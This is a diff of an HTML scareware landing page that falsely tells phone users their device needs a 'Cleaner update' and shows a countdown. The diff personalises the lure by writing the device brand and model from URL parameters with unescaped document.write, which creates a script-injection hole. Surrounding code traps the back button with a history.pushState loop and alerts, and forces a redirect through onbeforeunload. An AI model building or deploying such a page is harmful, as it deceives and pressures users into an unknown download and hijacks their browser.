@@ -113,13 +113,13 @@ a,body{color:#000}body,html{margin:0;padding:0;width:auto;height:100%}body{font-
 <div class="window text_wrap">
 <div class="heads">
 <div class="text">
-Cleaner Update for <span class="device_brand">Samsung</span> is Recommended!<div class="close"></div>
+Cleaner Update for <span class="device_brand"><script>document.write(getURLParameter("device_brand"))</script></span> is Recommended!<div class="close"></div>
 </div>
 </div>
 <div class="text">
-<p>Your phone <span class="device_name device_name1">Samsung Galaxy S5</span> can work faster, we released a Cleaner update, and it is recommended for every phone.</p>
-                   <p>If you do not upgrade, your <span class="device_name">Samsung Galaxy S5</span> might be slowed down and your battery may discharges quickly.</p><p></p>
-                   <p>Update now for <strong>FREE</strong> to clean and boost your <span class="device_brand">Samsung</span> immediately!</p>
+<p>Your <span class="device_name device_name1"><script>document.write(getURLParameter("device_model"))</script></span> can work faster, we released a Cleaner update, and it is recommended for every phone.</p>
+                   <p>If you do not upgrade, your <span class="device_name"><script>document.write(getURLParameter("device_model"))</script></span> might be slowed down and your battery may discharges quickly.</p><p></p>
+                   <p>Update now for <strong>FREE</strong> to clean and boost your <span class="device_brand"><script>document.write(getURLParameter("device_brand"))</script></span> immediately!</p>
 <p style="text-align:center;margin-top:10px;"><span style="font-size:15px;color:red;font-family:sans-serif;" id="theTime">5 minutes 40 seconds</span></p>
 </div>
         <div class="buttons">
@@ -142,7 +142,7 @@ Cleaner Update for <span class="device_brand">Samsung</span> is Recommended!<div
             for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
             onpopstate = function (t) {
                 if(count%2 == 1) {
-                    alert("You should update your Android Cleaner now or your phone Samsung Galaxy S5 can slow down and the battery can be drained faster.")
+                    alert("You should update your Android Cleaner now or your phone "+getURLParameter('device_model')+" can slow down and the battery can be drained faster.")
                 }
                 count++;
                 t.state && location.replace("#")
@@ -162,7 +162,7 @@ Cleaner Update for <span class="device_brand">Samsung</span> is Recommended!<div
                     to = setTimeout(function () {
                         RedirectUrl();
                     }, 100);
-                    return "You should update your Android Cleaner now or your phone Samsung Galaxy S5 can slow down and the battery can be drained faster.";
+                    return "You should update your Android Cleaner now or your phone "+getURLParameter('device_model')+" can slow down and the battery can be drained faster.";
                 }
                 w.onbeforeunload = epp;
                 var ln = d.querySelectorAll(".redirecturl");
